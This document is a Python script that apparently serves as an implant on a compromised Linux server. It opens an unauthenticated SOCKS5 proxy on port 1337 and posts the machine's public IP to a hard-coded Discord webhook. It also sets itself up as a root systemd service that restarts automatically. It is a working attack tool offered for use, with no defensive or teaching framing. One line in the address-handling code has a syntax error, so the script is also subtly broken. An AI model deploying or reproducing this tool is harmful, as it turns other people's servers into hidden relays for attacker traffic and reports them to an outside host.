#!/usr/bin/env python3
import socket
import threading
import requests
import time
import os
import sys
from datetime import datetime

class SOCKS5Proxy:
    def __init__(self, host='0.0.0.0', port=1337):
        self.host = host
        self.port = port
        self.running = True
        
    def handle_client(self, client_socket, client_addr):
        try:
            # SOCKS5 handshake
            version = client_socket.recv(1)
            if version != b'\x05':
                client_socket.close()
                return
                
            nmethods = client_socket.recv(1)[0]
            methods = client_socket.recv(nmethods)
            
            # No authentication required
            client_socket.send(b'\x05\x00')
            
            # Read request
            request = client_socket.recv(4)
            if len(request) < 4:
                client_socket.close()
                return
                
            version, cmd, rsv, atype = request
            
            if cmd != 1:  # Only CONNECT supported
                client_socket.send(b'\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00')
                client_socket.close()
                return
            
            # Handle address type
            if atype == 1:  IPv4
                dest_addr = socket.inet_ntoa(client_socket.recv(4))
                dest_port = int.from_bytes(client_socket.recv(2), 'big')
            elif atype == 3:  # Domain name
                domain_length = client_socket.recv(1)[0]
                dest_addr = client_socket.recv(domain_length).decode()
                dest_port = int.from_bytes(client_socket.recv(2), 'big')
            else:
                client_socket.send(b'\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00')
                client_socket.close()
                return
            
            # Connect to destination
            try:
                remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                remote_socket.connect((dest_addr, dest_port))
                
                # Send success response
                client_socket.send(b'\x05\x00\x00\x01' + socket.inet_aton('0.0.0.0') + b'\x00\x00')
                
                # Data forwarding
                self.forward_data(client_socket, remote_socket)
                
            except Exception as e:
                client_socket.send(b'\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00')
                
        except Exception as e:
            pass
        finally:
            client_socket.close()

    def forward_data(self, client, remote):
        while self.running:
            try:
                data = client.recv(4096)
                if not data:
                    break
                remote.sendall(data)
                
                response = remote.recv(4096)
                if not response:
                    break
                client.sendall(response)
                
            except:
                break
        remote.close()

    def start(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.host, self.port))
        sock.listen(50)
        
        print(f'[+] SOCKS5 proxy started on {self.host}:{self.port}')
        
        while self.running:
            try:
                client_socket, client_addr = sock.accept()
                print(f'[+] New connection from {client_addr[0]}:{client_addr[1]}')
                thread = threading.Thread(target=self.handle_client, args=(client_socket, client_addr))
                thread.daemon = True
                thread.start()
            except:
                break

def send_to_discord():
    webhook_url = 'https://discord.com/api/webhooks/1403000617143762985/89m4zh4QzJkk98ouY-2yUPr1L_TiN4WezeBOQ_zqTuHvDPx-RRFQRBzKiV0UpPsNIOzr'
    try:
        public_ip = requests.get('https://api.ipify.org', timeout=10).text
    except:
        public_ip = socket.gethostbyname(socket.gethostname())
    
    data = {
        'content': f'🚀 SOCKS5 Proxy Activated!\n**IP:** `{public_ip}`\n**Port:** `1337`\n**Time:** {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}\n**Status:** ✅ Online',
        'username': 'Auto-Proxy-Bot'
    }
    
    try:
        requests.post(webhook_url, json=data, timeout=15)
    except:
        pass

def setup_autostart():
    # Create systemd service
    service_content = f"""[Unit]
Description=SOCKS5 Proxy Service
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root
ExecStart=/usr/bin/python3 /root/socks5_proxy.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
    
    with open('/etc/systemd/system/socks5-proxy.service', 'w') as f:
        f.write(service_content)
    
    os.system('systemctl daemon-reload')
    os.system('systemctl enable socks5-proxy.service')
    os.system('systemctl start socks5-proxy.service')

if __name__ == "__main__":
    send_to_discord()
    
    # Setup autostart if not already set up
    if not os.path.exists('/etc/systemd/system/socks5-proxy.service'):
        setup_autostart()
    
    proxy = SOCKS5Proxy()
    proxy.start()
